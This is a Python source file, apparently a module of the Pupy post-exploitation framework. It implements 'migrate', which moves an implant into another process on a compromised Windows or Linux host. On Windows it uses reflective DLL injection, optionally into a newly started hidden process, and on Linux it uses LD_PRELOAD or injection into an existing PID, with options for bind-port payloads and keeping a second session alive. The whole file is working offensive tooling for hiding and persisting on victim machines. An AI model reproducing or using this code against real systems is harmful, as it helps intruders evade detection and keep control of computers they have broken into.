# -*- coding: utf-8 -*-

from __future__ import absolute_import
from __future__ import division
from __future__ import print_function
from __future__ import unicode_literals

from pupylib.PupyModule import config, PupyModule, PupyArgumentParser

from modules.lib.windows.migrate import migrate as win_migrate
from modules.lib.linux.migrate import migrate as lin_migrate
from modules.lib.linux.migrate import ld_preload

__class_name__ = 'MigrateModule'


@config(cat='manage', compat=['linux', 'windows'])
class MigrateModule(PupyModule):
    ''' Migrate pupy into another process using reflective DLL injection '''

    max_clients = 1
    dependencies = {
        'windows': ['pupwinutils.processes']
    }

    @classmethod
    def init_argparse(cls):
        cls.arg_parser = PupyArgumentParser(
            prog='migrate', description=cls.__doc__
        )
        cls.arg_parser.add_argument(
            '--no-wait', action='store_false', default=True,
            help='Does not Hook exit thread function and wait '
            'until pupy exists (Linux)'
        )

        cls.arg_parser.add_argument(
            '-d', '--debug', action='store_true', default=False,
            help='enable debug option in pupy config'
        )

        group = cls.arg_parser.add_mutually_exclusive_group(required=True)
        group.add_argument(
            '-c', '--create', metavar='<exe_path>',
            help='create a new process and inject into it'
        )
        group.add_argument(
            '-p', '--process', metavar='process_name',
            help='search a process name and migrate into'
        )
        group.add_argument(
            '--port', type=int,
            help='Set port for bind payload'
        )
        group.add_argument(
            'pid', nargs='?', type=int, help='pid'
        )
        cls.arg_parser.add_argument(
            '-P', '--payload', help='Use precompiled payload. Must be DLL'
        )
        cls.arg_parser.add_argument(
            '-k', '--keep', action='store_true',
            help='migrate into the process but create a new session and keep '
            'the current pupy session running'
        )
        cls.arg_parser.add_argument(
            '-t', '--timeout', type=int, default=30,
            help='time in seconds to wait for the connection'
        )

    def run(self, args):
        if self.client.is_windows():
            # If current launcher uses a BIND connection,
            # isBindConnection == True
            isBindConnection = False

            if self.client.desc['launcher'] == 'bind' and not args.port:
                isBindConnection = True

                self.error(
                    'The current launcher uses a bind connection: '
                    'bind port required'
                )

                return

            pid = None

            if args.create:
                start_hidden_process = self.client.remote(
                    'pupwinutils.processes', 'start_hidden_process'
                )

                self.success('Migrating to new windows process')
                pid = start_hidden_process(args.create)
                self.success(
                    '%s created with pid %s' % (args.create, pid)
                )

            elif args.process:
                self.success('Looking for process %s' % args.process)
                pstree = self.client.remote('pupyps', 'pstree')
                root, tree, data = pstree()
                for pid, properties in data.items():
                    proc = properties['exe']
                    if not proc:
                        continue

                    if args.process.lower() in proc.lower():
                        pid = int(pid)
                        self.success(
                            'Migrating to existing windows process {} '
                            'identified with the pid {}'.format(proc, pid)
                        )

                        break
            else:
                self.success(
                    'Migrating to existing windows process '
                    'identified with the pid {0}'.format(args.pid)
                )
                pid = args.pid

            win_migrate(
                self, pid, args.keep, args.timeout,
                bindPort=args.port, debug=args.debug, from_payload=args.payload
            )

            if isBindConnection:
                listeningAddress = self.client.desc['address'].split(':')[0]
                listeningAddressPortForBind = '{0}:{1}'.format(
                    listeningAddress, args.port
                )

                self.success(
                    "You have to connect to the target manually on {0}: try "
                    "'connect --host {0}' in pupy shell".format(
                        listeningAddressPortForBind
                    )
                )

        elif self.client.is_linux():
            if args.create:
                self.success(
                    'Migrating to new linux process using LD_PRELOAD'
                )

                ld_preload(
                    self, args.create, wait_thread=args.no_wait,
                    keep=args.keep, debug=args.debug,
                    from_payload=args.payload
                )
            else:
                self.success('Migrating to existing linux process')
                lin_migrate(
                    self, args.pid, args.keep, debug=args.debug
                )
